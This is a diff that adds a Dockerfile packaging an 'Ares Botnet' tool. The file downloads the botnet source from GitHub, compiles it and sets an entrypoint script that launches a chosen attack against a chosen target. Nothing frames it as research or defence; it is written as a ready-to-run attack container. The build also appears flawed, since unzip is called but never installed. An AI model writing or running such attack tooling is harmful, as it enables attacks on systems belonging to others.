@@ -1,0 +1,27 @@
+# Pull the latest Ubuntu image
+FROM ubuntu:latest
+ 
+# Update the image
+RUN apt-get update
+
+# Install prerequisites
+RUN apt-get install -y curl wget gcc make
+ 
+# Install Ares Botnet
+RUN curl -L https://github.com/sweetsoftwares/ares-botnet/archive/master.zip -o /tmp/ares-botnet-master.zip && \
+    unzip /tmp/ares-botnet-master.zip -d /opt/ && \
+    cd /opt/ares-botnet-master && \
+    make
+
+# Create script file
+RUN echo "#!/bin/bash" >> /usr/local/bin/execute_ares_botnet.sh && \
+    echo "cd /opt/ares-botnet-master" >> /usr/local/bin/execute_ares_botnet.sh && \
+    echo "./ares --attack \"\$1\" --target \"\$2\"" >> /usr/local/bin/execute_ares_botnet.sh && \
+    chmod +x /usr/local/bin/execute_ares_botnet.sh
+
+# Set the entrypoint of the container
+ENTRYPOINT ["/usr/local/bin/execute_ares_botnet.sh"]
+
+# To run the container the user needs to specify the attack and target parameters
+# docker run -it <image_name> <attack> <target>
+
